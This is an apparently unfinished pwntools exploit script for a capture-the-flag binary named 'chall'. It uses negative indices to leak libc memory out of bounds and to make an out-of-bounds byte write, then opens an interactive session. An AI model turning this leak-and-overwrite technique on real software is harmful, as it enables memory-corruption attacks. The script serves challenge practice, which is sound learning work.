from pwn import *  # Import pwntools

# Set logging level
#context.log_level = 'debug'

# Remote connection details
remote_host = "13.201.177.68"
remote_port = 31570

# Binary name
binary = './chall'  # Update this with the actual binary name

# Connection setup
# Uncomment the following line to connect remotely
# conn = remote(remote_host, remote_port)

# Uncomment the following line to test locally with the binary
conn = process(binary)

# Attach GDB and set the breakpoint (optional for debugging)
gdb.attach(conn, '''
b *main+225
c
''')

def leak(index):
    leak = b""
    for i in range(16):
        conn.sendlineafter(b'----------------------------', b'2')
        conn.sendlineafter(b'index: ', f"{index + i}".encode())
        conn.recvuntil(b'char: ')
        leak += conn.recv(1)
    return leak

def bl(bytes_data):
    return int.from_bytes(bytes_data, 'little')

def main():
    input("Enter.......")
    log.info("Starting memory leak...")
    libc_address = bl(leak(-78)[:6]) - 0x277040
    log.info(f"Libc base address: {hex(libc_address)}")
    conn.sendlineafter(b'----------------------------', b'1')
    conn.sendlineafter(b'index: ', b'-38')
    conn.sendlineafter(b'char: ', b'\xde')

    conn.interactive()

if __name__ == "__main__":
    main()